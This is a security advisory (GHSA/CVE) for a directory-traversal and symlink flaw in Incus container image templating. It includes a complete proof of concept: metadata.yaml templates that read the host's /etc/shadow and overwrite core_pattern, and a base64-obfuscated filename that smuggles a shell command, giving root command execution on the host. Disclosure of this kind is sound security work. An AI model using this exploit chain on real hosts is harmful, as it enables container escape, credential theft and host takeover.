# Incus container image templating arbitrary host file read and write

**GHSA**: GHSA-7f67-crqm-jgh7 | **CVE**: CVE-2026-23954 | **Severity**: high (CVSS 8.7)

**CWE**: CWE-22

**Affected Packages**:
- **github.com/lxc/incus/v6/cmd/incusd** (go): >= 6.1.0, <= 6.20.0
- **github.com/lxc/incus/v6/cmd/incusd** (go): <= 6.0.5

## Description

### Summary
A user with the ability to launch a container with a custom image (e.g a member of the ‘incus’ group) can use directory traversal or symbolic links in the templating functionality to achieve host arbitrary file read, and host arbitrary file write, ultimately resulting in arbitrary command execution on the host. This can also be exploited in IncusOS.

### Details
When using an image with a `metadata.yaml` containing templates, both the source and target paths are not checked for symbolic links or directory traversal. [1] [2] For example, the following `metadata.yaml` snippet can read an arbitrary file from the host root filesystem as root, and place it inside the container:

```
templates:
  /shadow:
    when:
      - start
    template: ../../../../../../../../etc/shadow
```

Additionally, the path of the target of the template is not checked or opened safely, and can therefore contain symbolic links pointing outside the container root filesystem. For example:

```
templates:
 /realroot/proc/sys/kernel/core_pattern:
    when:
      - start
    template: core_pattern.tpl
```

Where the container root filesystem contains a symbolic link named `/realroot` pointing to `/`. This will cause the contents of the template (from the normal "templates" directory in this case) to be written to the host root filesystem as root.

This can be exploited to achieve arbitrary command execution on the host by overwriting key files. In the provided proof of concept, I am overwriting `/proc/sys/kernel/core_pattern`, followed by causing a crash inside the container once launched to execute arbitrary commands on the host. Many other methods are possible depending on the host operating system and configuration.

This vulnerability can be exploited by any user who can launch a new container with a custom image.

Exploiting this vulnerability on IncusOS requires a slight modification of stage2 to change to a different writable directory for the validation step (e.g /tmp). This can be confirmed with a second container with `/tmp` mounted from the host (A privileged action for validation only).


[1] https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7215
[2] https://github.com/lxc/incus/blob/HEAD/internal/server/instance/drivers/driver_lxc.go#L7294

### PoC
A proof of concept script for the following can be found attached, named `template_arbitrary_write.sh`, which will show reading of a file from the host filesystem (`/etc/shadow`), as well as a method for escaping from the container to achieve arbitrary command execution, which will write a file to the root filesystem (`/template_arbitrary_write_cmd_exec_poc`).

Manual Reproduction steps:

1. Obtain and unpack a legitimate root filesystem (e.g alpine/edge) into a directory named rootfs
2. Inside the unpacked root filesystem, create a symbolic link named ‘realroot’ (i.e `ln -s / rootfs/realroot`)
3. Create a directory named “templates” alongside the rootfs directory. Include a file `core_pattern.tpl` containing `|/bin/sh -c "%E"`
4. Additionally, add files segfault.c and stage2 to the root filesystem (listed below), setting stage2 executable (`chmod +x rootfs/stage2`
5. Create a `metadata.yaml` for this image. Sample listed below
6. Create the image archive (`tar cf poc.tar *`) and import into incus (`incus image import poc.tar --alias poc`)
7. Launch the newly imported image and obtain a shell (`incus launch poc poc --ephemeral; incus shell poc`)
8. Observe that the file `/shadow` inside the container contains the contents of the `/etc/shadow` file from the host (host file read vulnerability)
9. Compile `segfault.c` into a file named `x$(echo L3Zhci9saWIvaW5jdXMvY29udGFpbmVycy8qL3Jvb3Rmcy9zdGFnZTIK|base64 -d|sh)`. This filename will be interpolated into the `%E` value set in the `core_pattern` by the host file write vulnerability, and will find and execute the stage2 binary inside the container rootfs.
10. Execute the compiled binary (e.g `/x*`). Observe the creation of the file `/template_arbitrary_write_cmd_exec_poc` on the host, containing the output of 'id' showing command execution by the host root user.

segfault.c:
```
int main() {
    int *p = 0;
    *p = 42;
    return 0;
}
```

stage2:
```
#!/bin/sh
id > /template_arbitrary_write_cmd_exec_poc
```

metadata.yaml:
```
architecture: x86_64
creation_date: 1
properties:
  architecture: amd64
  description: Exploit
  os: Exploit
  release: Exploit 1.0
templates:
  /shadow:
    when:
      - start
    template: ../../../../../../../../etc/shadow

  /realroot/proc/sys/kernel/core_pattern:
    when:
      - start
    template: core_pattern.tpl
```

### Impact
A user with the ability to launch a container with a custom image can achieve arbitrary command execution on the host.

### Attachments
[template_arbitrary_write.sh](https://github.com/user-attachments/files/24473599/template_arbitrary_write.sh)
[templates_arbitrary_write.patch](https://github.com/user-attachments/files/24473601/templates_arbitrary_write.patch)
